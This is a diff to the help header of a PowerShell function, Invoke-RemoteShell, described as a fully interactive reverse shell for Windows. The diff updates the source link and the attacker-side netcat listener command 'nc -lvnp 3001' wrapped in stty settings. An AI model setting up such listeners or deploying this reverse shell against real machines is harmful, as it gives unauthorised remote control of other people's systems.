@@ -5,7 +5,7 @@ function Invoke-RemoteShell
             RemoteShell - Fully Interactive Reverse Shell for Windows 
             Author: splinter_code
             License: MIT
-            Source: https://github.com/antonioCoco/RemoteShell
+            Source: https://github.com/antonioCoco/ConPtyShell
         
         .DESCRIPTION
             RemoteShell - Fully interactive reverse shell for Windows
@@ -15,7 +15,7 @@ function Invoke-RemoteShell
             
             You can avoid to set rows and cols values if you run your listener
             with the following command:
-                stty raw -echo; (stty size; cat) | nc -lvnp 3001
+                 stty raw -echo; (stty size; cat) | nc -lvnp 3001; stty sane
            
             If you want to change the console size directly from powershell
             you can paste the following commands:
